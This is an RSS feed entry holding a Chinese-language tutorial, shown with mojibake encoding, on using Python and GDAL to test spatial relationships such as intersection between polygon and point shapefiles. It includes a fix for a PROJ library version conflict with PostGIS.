<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[GDAL ç©ºé—´å…³ç³»è§£æ]]></title>    <link>https://juejin.cn/post/7592803747471704114</link>    <guid>https://juejin.cn/post/7592803747471704114</guid>    <pubDate>2026-01-08T12:08:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592803747471704114" data-draft-id="7592816646870499337" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GDAL ç©ºé—´å…³ç³»è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T12:08:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GISä¹‹è·¯"/> <meta itemprop="url" content="https://juejin.cn/user/4346787284915481"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GDAL ç©ºé—´å…³ç³»è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4346787284915481/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GISä¹‹è·¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:08:54.000Z" title="Thu Jan 08 2026 12:08:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">^Â å…³æ³¨æˆ‘ï¼Œå¸¦ä½ ä¸€èµ·å­¦GISÂ ^</h2>
<h2 data-id="heading-1">å‰è¨€</h2>
<blockquote>
<p>â</p>
<p>ç©ºé—´å…³ç³»ç”¨äºåˆ¤æ–­å‡ ä½•å¯¹è±¡ä¹‹é—´ä½ç½®å…³ç³»ï¼ŒGDALæ”¯æŒç›¸äº¤ã€ç›¸ç¦»ã€åŒ…å«ç­‰å¤šç§ç©ºé—´å…³ç³»ã€‚åœ¨GISå¼€å‘ä¸­ï¼Œç©ºé—´åˆ†æç¦»ä¸å¼€å‡†ç¡®çš„ç©ºé—´å…³ç³»åˆ¤æ–­ï¼Œé€‰æ‹©ä½•ç§ç©ºé—´å…³ç³»ï¼Œå¯¹æ•°æ®æŸ¥è¯¢å’Œåˆ†æé€Ÿåº¦çš„å½±å“ä¹Ÿä¼šæœ‰å·®å¼‚ï¼Œæ‰€ä»¥ï¼Œç†Ÿç»ƒæŒæ¡å„ç§ç©ºé—´å…³ç³»æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚</p>
</blockquote>
<p>åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­è®²äº†å¦‚ä½•ä½¿ç”¨<code>GDAL</code>æˆ–è€…<code>ogr2ogr</code>å·¥å…·å°†<code>txt</code>ä»¥åŠ<code>csv</code>æ–‡æœ¬æ•°æ®è½¬æ¢ä¸º<code>Shp</code>æ ¼å¼ï¼Œæœ¬ç¯‡æ•™ç¨‹åœ¨ä¹‹å‰ä¸€ç³»åˆ—æ–‡ç« çš„åŸºç¡€ä¸Šè®²è§£å¦‚ä½•ä½¿ç”¨<strong>GDAL ç©ºé—´å…³ç³»è§£æ</strong>ã€‚</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQtb_BJw91nKrFMeoa7WcxA" target="_blank" title="https://mp.weixin.qq.com/s/Qtb_BJw91nKrFMeoa7WcxA" ref="nofollow noopener noreferrer">GDAL ç®€ä»‹</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFLWfZItLj24JYicQEX-PbQ" target="_blank" title="https://mp.weixin.qq.com/s/FLWfZItLj24JYicQEX-PbQ" ref="nofollow noopener noreferrer">GDAL ä¸‹è½½å®‰è£…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fu0539e3CM2q4Y3MbMxxZKQ" target="_blank" title="https://mp.weixin.qq.com/s/u0539e3CM2q4Y3MbMxxZKQ" ref="nofollow noopener noreferrer">GDAL å¼€å‘èµ·æ­¥</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL å®ç° GIS æ•°æ®è¯»å–è½¬æ¢ï¼ˆå…¨ï¼‰</a></li>
</ul>
<p>å¦‚æœä½ è¿˜æ²¡æœ‰çœ‹è¿‡ï¼Œå»ºè®®ä»ä»¥ä¸Šå†…å®¹å¼€å§‹ã€‚</p>
<h2 data-id="heading-2">1. å¼€å‘ç¯å¢ƒ</h2>
<p>æœ¬æ–‡ä½¿ç”¨å¦‚ä¸‹å¼€å‘ç¯å¢ƒï¼Œä»¥ä¾›å‚è€ƒã€‚</p>
<p>æ—¶é—´ï¼š<code>2025å¹´</code></p>
<p>ç³»ç»Ÿï¼š<code>Windows 11</code></p>
<p>Pythonï¼š<code>3.11.7</code></p>
<p>GDALï¼š<code>3.11.1</code></p>
<h2 data-id="heading-3">2. åˆ¤æ–­å‡ ä½•å…³ç³»</h2>
<p>å®šä¹‰ä¸€ä¸ªæ–¹æ³•<code>SpatialRelations</code>ç”¨äºåˆ¤æ–­è¦ç´ é—´ç©ºé—´å…³ç³»ï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­<code>polygonPath</code>æŒ‡å‘é¢æ–‡ä»¶è·¯å¾„ï¼Œ<code>pointPath</code>æŒ‡å‘ç‚¹æ–‡ä»¶è·¯å¾„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
è¯´æ˜ï¼šåˆ¤æ–­ç©ºé—´å…³ç³»
å‚æ•°ï¼š
Â  Â  -polygonPathï¼šé¢å›¾å±‚æ•°æ®è·¯å¾„
Â  Â  -pointPathï¼šç‚¹å›¾å±‚æ•°æ®è·¯å¾„
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">SpatialRelations</span>(<span class="hljs-params">polygonPath,pointPath</span>):
</code></pre>
<p>å¯¹äºæ•°æ®çš„åŸºç¡€æ“ä½œæ­¥éª¤ä¸ºè·å–æ•°æ®é©±åŠ¨ï¼Œè·å–æ•°æ®æºï¼Œå†åˆ°è·å–ç›®æ ‡å›¾å±‚ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
checkFilePath(polygonPath)
checkFilePath(pointPath)

<span class="hljs-comment"># æ·»åŠ æ•°æ®é©±åŠ¨</span>
<span class="hljs-attr">shpDriver</span> = ogr.GetDriverByName(<span class="hljs-string">"ESRI Shapefile"</span>)

<span class="hljs-comment"># è·å–æ•°æ®æº</span>
<span class="hljs-attr">polygonDs</span> = shpDriver.Open(polygonPath)
<span class="hljs-attr">pointDs</span> = shpDriver.Open(pointPath)

<span class="hljs-comment"># è·å–å›¾å±‚</span>
<span class="hljs-attr">polygonLayer</span> = polygonDs.GetLayer(<span class="hljs-number">0</span>)
<span class="hljs-attr">pointLayer</span> = pointDs.GetLayer(<span class="hljs-number">0</span>)
</code></pre>
<p>æ–¹æ³•<code>checkFilePath</code>ç”¨äºæ£€æŸ¥æ–‡ä»¶è·¯å¾„æ˜¯å¦æ­£å¸¸ï¼Œæ¥å—ä¸€ä¸ªè·¯å¾„å‚æ•°ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
è¯´æ˜ï¼šæ£€æŸ¥æ–‡ä»¶è·¯å¾„æ˜¯å¦æ­£å¸¸
å‚æ•°ï¼š
Â  Â  -filePathï¼šæ–‡ä»¶æ•°æ®è·¯å¾„
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">checkFilePath</span>(<span class="hljs-params">filePath</span>):
Â  Â Â <span class="hljs-keyword">if</span>Â os.path.exists(filePath):
Â  Â  Â  Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ–‡ä»¶æ•°æ®è·¯å¾„å­˜åœ¨"</span>)
Â  Â Â <span class="hljs-keyword">else</span>:
Â  Â  Â  Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ–‡ä»¶æ•°æ®è·¯å¾„ä¸å­˜åœ¨ï¼Œè¯·æ£€æŸ¥ï¼"</span>)
</code></pre>
<p>æœ¬æ–‡åŸºäºä»¥ä¸‹æ•°æ®è¿›è¡Œç©ºé—´å…³ç³»åˆ¤æ–­ã€‚<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cb80e06c8dc41f5b4b59eafeca9d1e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=dN9QLk5QGP9ki%2FJw4E4ZkdCQMT4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">3. ç›¸äº¤å…³ç³»</h2>
<p>é€šè¿‡<code>GetNextFeature</code>æˆ–è€…<code>GetFeature</code>æ–¹æ³•è·å–è¦ç´ ï¼Œå…¶ä¸­<code>GetFeature</code>æ–¹æ³•éœ€è¦ä¼ å…¥æŒ‡å®š<code>FId</code>å‚æ•°ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">Â  Â Â <span class="hljs-comment"># éå†é¢å›¾å±‚è¦ç´ </span>
Â  Â Â forÂ polyFeatureÂ inÂ polygonLayer:
Â  Â  Â  Â Â <span class="hljs-comment"># è·å–å‡ å¯¹è±¡</span>
Â  Â  Â  Â  <span class="hljs-attr">polyGeom</span> = polyFeature.GetGeometryRef()
Â  Â  Â  Â Â <span class="hljs-comment"># è·å–è¦ç´ Id</span>
Â  Â  Â  Â  <span class="hljs-attr">featId</span> = polyFeature.GetField(<span class="hljs-string">"Id"</span>)
Â  Â  Â  Â Â print(f"né¢çŠ¶è¦ç´ ~~~~~Idï¼š{featId}n")

Â  Â  Â  Â Â <span class="hljs-comment"># è·å–å‡ ä½•è¦ç´ </span>
Â  Â  Â  Â  <span class="hljs-attr">polyGeom</span> = polyFeature.GetGeometryRef()
Â  Â  Â  Â Â <span class="hljs-comment"># print(f"é¢çŠ¶å‡ ä½•ï¼š{polyGeom}")</span>

Â  Â  Â  Â Â <span class="hljs-comment"># éå†ç‚¹å›¾å±‚è¦ç´ </span>
Â  Â  Â  Â Â forÂ ptFeatureÂ inÂ pointLayer:
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># è·å–å‡ ä½•å¯¹è±¡</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">ptGeom</span> = ptFeature.GetGeometryRef()
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># print(f"ç‚¹çŠ¶å‡ ä½•ï¼š{ptGeom1}")</span>

Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># è·å–è¦ç´ åç§°</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">featName</span> = ptFeature.GetField(<span class="hljs-string">"name"</span>) Â Â 

Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># ç›¸äº¤</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">result</span> = polyGeom.Intersect(ptGeom)

Â  Â  Â  Â  Â  Â  <span class="hljs-attr">description</span> =Â <span class="hljs-string">"ä¸ç›¸äº¤"</span>Â ifÂ result == <span class="hljs-literal">False</span>Â elseÂ <span class="hljs-string">"^^ğŸ˜Šç›¸äº¤ğŸ˜Š^^"</span>

Â  Â  Â  Â  Â  Â Â print(f"é¢è¦ç´ ã€{featId}ã€‘ä¸ç‚¹è¦ç´ ã€{featName}ã€‘ æ˜¯å¦ç›¸äº¤ï¼š{result} ï¼ˆ{description}ï¼‰")Â 
</code></pre>
<p>å…¶ä¸­<strong>ç›¸äº¤</strong>å…³ç³»è¾“å‡ºç»“æœæ˜¾ç¤ºå¦‚ä¸‹ï¼Œä¸å›¾å½¢æ˜¾ç¤ºç»“æœä¸€è‡´ã€‚<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3047c9ade63a4cbca34e2c74eaf0b017~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=lVZ7gSbAZQzRv91CCiz2ZMveO5U%3D" alt="" loading="lazy"/></p>
<p>å…¶ä¸­<strong>ç›¸ç¦»</strong>å…³ç³»è¾“å‡ºç»“æœæ˜¾ç¤ºå¦‚ä¸‹ï¼Œä¸å›¾å½¢æ˜¾ç¤ºç»“æœä¸€è‡´ã€‚<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e46673e9a814a41a16a58fdaf7dfdd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=JQyypc6Ae49MvQkV95TLuTsGgWs%3D" alt="" loading="lazy"/></p>
<p>å…¶ä¸­<strong>ç›¸æ¥</strong>å…³ç³»è¾“å‡ºç»“æœæ˜¾ç¤ºå¦‚ä¸‹ï¼Œä¸å›¾å½¢æ˜¾ç¤ºç»“æœä¸€è‡´ã€‚<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f66aabfa22834706bfcfcc10c5455ebc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=U3IDz7zxZNCNMaUc%2BAzpQxphqMc%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰<strong>åŒ…å«ï¼ˆContainsï¼‰ã€é‡å ï¼ˆOverlapsï¼‰ã€åœ¨...ä¹‹å†…ï¼ˆWithinï¼‰</strong> ç­‰ç©ºé—´å…³ç³»ï¼Œç•™ç»™æ„Ÿå…´è¶£çš„è¯»è€…è‡ªè¡Œå®ç°ã€‚</p>
<h2 data-id="heading-5">4. æ³¨æ„äº‹é¡¹</h2>
<p>åœ¨<code>windows</code>å¼€å‘ç¯å¢ƒä¸­åŒæ—¶å®‰è£…<code>GDAL</code>ä¸<code>PostGIS</code>ï¼Œå…¶ä¸­æŠ•å½±åº“<code>PROJ</code>çš„ç¯å¢ƒå˜é‡æŒ‡å‘<code>PostGIS</code>çš„å®‰è£…è·¯å¾„ï¼Œåœ¨è¿è¡ŒGDALç¨‹åºæ—¶ï¼Œæ¶‰åŠåˆ°è¦ç´ ã€å‡ ä½•ä¸æŠ•å½±æ“ä½œæ—¶ä¼šå¯¼è‡´å¼‚å¸¸ã€‚<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0cac649d51f46ec9f78e3c3e3c46a75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=txRoneDaubltLP3GULJvfWOdIo8%3D" alt="" loading="lazy"/>å…·ä½“æ„æ€ä¸º<code>GDAL</code>ä¸æ”¯æŒ<code>PostGIS</code>æ’ä»¶ä¸­çš„æŠ•å½±åº“ç‰ˆæœ¬ï¼Œéœ€è¦æ›´æ¢æŠ•å½±åº“æˆ–è€…å‡çº§ç‰ˆæœ¬ã€‚</p>
<p><code>RuntimeError: PROJ: proj_identify: D:Program FilesPostgreSQL13sharecontribpostgis-3.5projproj.db contains DATABASE.LAYOUT.VERSION.MINOR = 2 whereas a number &gt;= 5 is expected. It comes from another PROJ installation.</code><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5ea7f04c3ad4675884c9c0836f2df24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=es6sF8ZO%2FB1Ndd1iixGv1G6wKDg%3D" alt="" loading="lazy"/></p>
<p>è§£å†³åŠæ³•ä¸ºä¿®æ”¹<code>PROJ</code>çš„ç¯å¢ƒå˜é‡åˆ°<code>GDAL</code>æ”¯æŒçš„ç‰ˆæœ¬æˆ–è€…åœ¨<code>GDAL</code>ç¨‹åºå¼€å¤´æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python">os.environ[<span class="hljs-string">'PROJ_LIB'</span>] = <span class="hljs-string">r'D:\Programs\Python\Python311\Libsite-packages\osgeo\data\proj'</span>
</code></pre>
<p><strong>å›¾ç‰‡æ•ˆæœ</strong></p>
<p><strong><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ee483022d85460798728b39b89153d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=6Pm89gQSEJYcqEv0julAlsLpQLE%3D" alt="" loading="lazy"/></strong></p>
<p><strong><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/390cf8e21ea5449892bd4494678d4e2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=a4bstRlYfcWyFbDo0C%2BvumHUmcQ%3D" alt="" loading="lazy"/></strong></p>
<blockquote>
<p>â</p>
<p>OpenLayersç¤ºä¾‹æ•°æ®ä¸‹è½½ï¼Œè¯·åœ¨å…¬ä¼—å·åå°å›å¤ï¼š<strong>olæ•°æ®</strong></p>
<p>å…¨å›½ä¿¡æ¯åŒ–å·¥ç¨‹å¸ˆï¼GIS åº”ç”¨æ°´å¹³è€ƒè¯•èµ„æ–™ï¼Œè¯·åœ¨å…¬ä¼—å·åå°å›å¤ï¼š<strong>GISè€ƒè¯•</strong></p>
</blockquote>
<blockquote>
<p>â</p>
<p><em><strong>GISä¹‹è·¯</strong></em> å…¬ä¼—å·å·²ç»æ¥å…¥äº†<strong>æ™ºèƒ½</strong> <strong>åŠ©æ‰‹</strong>ï¼Œå¯ä»¥åœ¨å¯¹è¯æ¡†è¿›è¡Œæé—®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æœç´¢å†å²æ–‡ç« è¿›è¡ŒæŸ¥çœ‹ã€‚</p>
</blockquote>
<p>éƒ½çœ‹åˆ°è¿™äº†ï¼Œä¸è¦å¿˜è®°<em><strong>ç‚¹èµã€æ”¶è—</strong></em> <strong>+</strong> <em><strong>å…³æ³¨</strong></em> å“¦ <strong>ï¼</strong></p>
<p>æœ¬å·ä¸å®šæ—¶æ›´æ–°æœ‰å…³Â <em><strong>GISå¼€å‘</strong></em> ç›¸å…³å†…å®¹ï¼Œ<em><strong>æ¬¢è¿å…³æ³¨Â <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d87caa25e9c345b396ff0b80d4160150~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=IfTgjHA1nMigzBkmeRlFJZsD6lE%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ae768f241384749a6733f0e4c6636fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=dKBQ%2F%2F%2FqdXWcNci5dmixaVuqghk%3D" alt="" loading="lazy"/></strong></em></p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac1f2a6a00f54d98b95e06c30e27c311~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=sZ3MlNAMnmU8YtQlOP3C36cZaEg%3D" alt="" loading="lazy"/></p>
<p>Â  Â <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a663e26fe71a49adba35d7b39b3c6f11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768478933&amp;x-signature=K3Fywed5cUG7wOPMAh68C057Fzc%3D" alt="" loading="lazy"/>Â </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487953%26idx%3D1%26sn%3D0b2d5aeefdb290583cf8cdd82f3c2077%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487953&amp;idx=1&amp;sn=0b2d5aeefdb290583cf8cdd82f3c2077&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">GeoTools å¼€å‘åˆé›†ï¼ˆå…¨ï¼‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487119%26idx%3D1%26sn%3Dc313efa84c27bf933ef2f2a47991ef2d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487119&amp;idx=1&amp;sn=c313efa84c27bf933ef2f2a47991ef2d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">OpenLayers å¼€å‘åˆé›†</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Ff1GPy_DNqtvEDzojlRmcBg" target="_blank" title="https://mp.weixin.qq.com/s/f1GPy_DNqtvEDzojlRmcBg" ref="nofollow noopener noreferrer">GDAL å®ç°æ•°æ®ç©ºé—´æŸ¥è¯¢</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FEyUADPYCf7O_9b0u8LUQCg" target="_blank" title="https://mp.weixin.qq.com/s/EyUADPYCf7O_9b0u8LUQCg" ref="nofollow noopener noreferrer">GDAL å®ç°æ•°æ®å±æ€§æŸ¥è¯¢</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FRdlldTRZ6c7FzfjBSdSPMg" target="_blank" title="https://mp.weixin.qq.com/s/RdlldTRZ6c7FzfjBSdSPMg" ref="nofollow noopener noreferrer">GDAL å®ç°åˆ›å»ºå‡ ä½•å¯¹è±¡</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FTUdUHgYra6oMlOaRIL1m4w" target="_blank" title="https://mp.weixin.qq.com/s/TUdUHgYra6oMlOaRIL1m4w" ref="nofollow noopener noreferrer">GDAL å®ç°è‡ªå®šä¹‰æ•°æ®åæ ‡ç³»</a></p>
